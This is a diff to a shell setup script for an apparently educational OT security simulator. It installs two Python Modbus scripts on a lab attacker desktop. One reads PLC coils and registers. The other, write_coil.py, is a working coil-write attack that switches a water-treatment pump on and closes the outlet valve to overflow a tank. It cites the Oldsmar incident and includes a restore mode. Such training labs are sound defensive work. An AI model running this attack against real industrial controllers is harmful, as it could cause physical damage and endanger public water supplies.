@@ -150,6 +150,213 @@ echo "[otforge-attack] VNC: no password required (SecurityTypes None; isolated w
 echo ""
 echo "[otforge-attack] Waiting for terminal sessions (docker exec)..."
 
+# ── Create Attack_Scripts desktop directory ───────────────────────────────────
+# Populate /root/Desktop/Attack_Scripts/ with ready-to-run pymodbus scripts so
+# students can immediately interact with the PLC without writing any code.
+# PLC_IP and PLC_PORT are injected by compose-generator.ts from the scenario's
+# first PLC device; scripts read them from the environment at runtime.
+
+mkdir -p /root/Desktop/Attack_Scripts
+
+# ── read_coils.py ─────────────────────────────────────────────────────────────
+# Connects to the PLC and prints coil states plus holding register values.
+# No writes — safe to run at any time for reconnaissance/observation.
+cat > /root/Desktop/Attack_Scripts/read_coils.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+read_coils.py — Read PLC coil and holding-register state via Modbus TCP.
+
+Usage:
+    python3 read_coils.py
+
+Environment variables (set automatically by the simulation):
+    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
+    PLC_PORT  Modbus TCP port               (default: 502)
+
+Coil map (Tutorial 01 — pump_control program):
+    Coil 0  pump_run     FALSE=pump off,     TRUE=pump on
+    Coil 1  valve_open   FALSE=valve closed, TRUE=valve open
+    Coil 2  emrg_stop    FALSE=normal,       TRUE=emergency tripped
+
+Holding register map:
+    HR 0  tank_level   Tank level in cm  (500 = 5.00 m, 1000 = 10.00 m overflow)
+    HR 1  inlet_flow   Inlet flow rate   (L/min; >0 means pump is running)
+    HR 2  outlet_flow  Outlet flow rate  (L/min; >0 means valve is open)
+"""
+
+import os
+import sys
+
+try:
+    from pymodbus.client import ModbusTcpClient
+except ImportError:
+    print("[error] pymodbus not installed. Run: pip3 install pymodbus")
+    sys.exit(1)
+
+# PLC_IP and PLC_PORT are injected into the container environment by
+# compose-generator.ts so students do not need to look up the IP manually.
+PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
+PLC_PORT = int(os.environ.get('PLC_PORT', '502'))
+
+COIL_LABELS = {
+    0: 'pump_run     (inlet pump)',
+    1: 'valve_open   (outlet valve)',
+    2: 'emrg_stop    (emergency stop)',
+}
+REG_LABELS = {
+    0: 'tank_level   (cm)',
+    1: 'inlet_flow   (L/min)',
+    2: 'outlet_flow  (L/min)',
+}
+
+print(f"[*] Connecting to PLC at {PLC_IP}:{PLC_PORT} ...")
+client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
+
+if not client.connect():
+    print(f"[error] Connection refused — is the simulation running?  ({PLC_IP}:{PLC_PORT})")
+    sys.exit(1)
+
+print(f"[+] Connected\n")
+
+# ── FC01 Read Coils 0–2 ───────────────────────────────────────────────────────
+print("=== COILS  (Modbus FC01 — Read Coils) ===")
+coil_result = client.read_coils(address=0, count=3, device_id=1)
+if coil_result.isError():
+    print(f"[error] read_coils failed: {coil_result}")
+else:
+    for idx in range(3):
+        state = "ON  (TRUE) " if coil_result.bits[idx] else "OFF (FALSE)"
+        label = COIL_LABELS.get(idx, f'coil_{idx}')
+        print(f"  Coil {idx}  {label:<35} {state}")
+
+print()
+
+# ── FC03 Read Holding Registers 0–2 ──────────────────────────────────────────
+print("=== HOLDING REGISTERS  (Modbus FC03 — Read Holding Registers) ===")
+reg_result = client.read_holding_registers(address=0, count=3, device_id=1)
+if reg_result.isError():
+    print(f"[error] read_holding_registers failed: {reg_result}")
+else:
+    for idx in range(3):
+        raw   = reg_result.registers[idx]
+        label = REG_LABELS.get(idx, f'reg_{idx}')
+        # HR 0 stores level in cm — show human-readable meters alongside
+        display = f"{raw} cm  ({raw / 100.0:.2f} m)" if idx == 0 else str(raw)
+        print(f"  HR   {idx}  {label:<35} {display}")
+
+print()
+client.close()
+print("[+] Done — no writes performed")
+PYEOF
+
+# ── write_coil.py ─────────────────────────────────────────────────────────────
+# Default (no args): executes the attack — pump ON + outlet valve CLOSED →
+# water flows in with no outflow, causing a tank overflow.
+# --restore flag: returns the PLC to its normal safe operating state.
+cat > /root/Desktop/Attack_Scripts/write_coil.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+write_coil.py — Modbus coil write attack against the Tutorial 01 water treatment PLC.
+
+Default action  (no flags):  ATTACK  — start inlet pump, close outlet valve.
+                              Inlet water accumulates; tank overflows.
+With --restore:              RESTORE — stop pump, open outlet valve.
+                              Returns PLC to normal safe operating state.
+
+This replicates the technique used in the 2021 Oldsmar, Florida water treatment
+attack: Modbus TCP carries no authentication, so any host on the OT network
+can write any coil or register on any PLC with no credentials required.
+
+Usage:
+    python3 write_coil.py           # execute attack
+    python3 write_coil.py --restore # restore normal operation
+
+Environment variables (set automatically by the simulation):
+    PLC_IP    IP address of the target PLC  (default: 10.200.10.10)
+    PLC_PORT  Modbus TCP port               (default: 502)
+"""
+
+import os
+import sys
+
+try:
+    from pymodbus.client import ModbusTcpClient
+except ImportError:
+    print("[error] pymodbus not installed. Run: pip3 install pymodbus")
+    sys.exit(1)
+
+# ── Mode selection ────────────────────────────────────────────────────────────
+RESTORE_MODE = '--restore' in sys.argv
+
+# ── Connection parameters ─────────────────────────────────────────────────────
+# PLC_IP and PLC_PORT are injected by compose-generator.ts from the scenario.
+PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
+PLC_PORT = int(os.environ.get('PLC_PORT', '502'))
+
+if RESTORE_MODE:
+    # Safe state: pump off, outlet valve open — water drains normally
+    PUMP_STATE  = False
+    VALVE_STATE = True
+    mode_label  = "RESTORE — return PLC to normal operating state"
+else:
+    # Attack state: pump on, outlet valve closed — tank overflow imminent
+    PUMP_STATE  = True
+    VALVE_STATE = False
+    mode_label  = "ATTACK  — pump ON + outlet valve CLOSED (overflow)"
+
+print(f"[*] Mode:      {mode_label}")
+print(f"[*] Target:    {PLC_IP}:{PLC_PORT}")
+print(f"[*] Coil 0 → {'TRUE  (pump ON)'    if PUMP_STATE  else 'FALSE (pump OFF)'}")
+print(f"[*] Coil 1 → {'TRUE  (valve OPEN)' if VALVE_STATE else 'FALSE (valve CLOSED)'}")
+print()
+print(f"[*] Connecting to PLC ...")
+
+client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
+if not client.connect():
+    print(f"[error] Connection refused — is the simulation running?  ({PLC_IP}:{PLC_PORT})")
+    sys.exit(1)
+
+print(f"[+] Connected — sending Modbus FC05 (Write Single Coil) frames ...\n")
+
+# ── Write Coil 0 — inlet pump ─────────────────────────────────────────────────
+r0 = client.write_coil(address=0, value=PUMP_STATE, device_id=1)
+if r0.isError():
+    print(f"[error] write_coil(0) failed: {r0}")
+    client.close()
+    sys.exit(1)
+print(f"[+] Coil 0 (inlet pump)    → {'TRUE  (ON)'   if PUMP_STATE  else 'FALSE (OFF)'}   — FC05 write ACK'd")
+
+# ── Write Coil 1 — outlet valve ───────────────────────────────────────────────
+r1 = client.write_coil(address=1, value=VALVE_STATE, device_id=1)
+if r1.isError():
+    print(f"[error] write_coil(1) failed: {r1}")
+    client.close()
+    sys.exit(1)
+print(f"[+] Coil 1 (outlet valve)  → {'TRUE  (OPEN)' if VALVE_STATE else 'FALSE (CLOSED)'} — FC05 write ACK'd")
+
+client.close()
+print()
+
+if RESTORE_MODE:
+    print("[+] PLC restored to normal operating state.")
+    print("    Coil 0 = FALSE (pump OFF) | Coil 1 = TRUE (valve OPEN)")
+    print("    Tank level will stabilise. Check Grafana to confirm.")
+else:
+    print("[+] ATTACK COMPLETE — PLC is now in an unsafe state.")
+    print("    Coil 0 = TRUE  (pump ON)  | Coil 1 = FALSE (valve CLOSED)")
+    print("    Inlet water is accumulating with no outlet — tank overflow imminent.")
+    print("    Watch the tank level (Holding Register 0) rise in Grafana.")
+    print()
+    print("    To restore normal operation:  python3 write_coil.py --restore")
+PYEOF
+
+chmod +x /root/Desktop/Attack_Scripts/read_coils.py
+chmod +x /root/Desktop/Attack_Scripts/write_coil.py
+
+echo "[otforge-attack] Attack_Scripts created:"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/read_coils.py  — read coil + register state"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/write_coil.py  — coil write attack (--restore to undo)"
+
 # ── Keep container alive ──────────────────────────────────────────────────────
 # The Electron xterm.js terminal attaches via `docker exec -i <name> /bin/bash`.
 # The process here just holds the container open; exec sessions are independent.
